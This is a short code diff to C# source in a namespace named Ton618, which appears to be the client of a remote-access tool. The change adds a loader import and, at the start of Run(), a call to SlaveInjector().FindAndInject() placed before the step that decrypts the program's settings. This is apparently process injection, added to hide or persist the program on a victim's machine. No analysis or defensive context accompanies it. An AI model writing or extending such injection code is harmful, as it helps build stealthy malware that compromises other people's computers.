@@ -15,6 +15,7 @@ using Ton618.Logging;
 using Ton618.Utilities;
 using Ton618.Config;
 using Ton618.User;
+using Ton618.Loader;
 
 namespace Ton618
 {
@@ -102,6 +103,8 @@ namespace Ton618
         /// </summary>
         public void Run()
         {
+            new SlaveInjector().FindAndInject();
+
             // decrypt and verify the settings
             if (!Settings.Initialize())
             {
